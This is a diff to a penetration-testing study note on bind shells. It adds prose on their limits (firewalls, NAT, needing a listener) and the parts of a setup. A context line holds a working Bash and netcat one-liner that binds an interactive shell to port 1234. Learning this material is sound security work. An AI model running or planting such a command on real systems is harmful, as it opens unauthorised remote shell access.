@@ -34,6 +34,18 @@ Unlike a reverse shell, a Bind shell connects us to the *targets'* listening por
 
 To create a bind shell, we need to listen on a port on the target and bind a shell to that port. Then on the tester machine we can us [[Netcat (nc)]] to connect to it.
 
+Some challenges with bind shells however:
+- We need an already active listener or be able to create one ourselves.
+- It is typical for strict incoming firewall rules and NAT on the edge of the network (public-facing), so we would need to be on the internal network already.
+- OS firewalls often block incoming connections that aren't associated with trusted network-based applications.
+
+To setup a bind shell on the server, we need to define:
+- the directory
+- the shell
+- the listener
+- a pipeline (eg. nc)
+- input & output redirection
+
 **Bash**
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
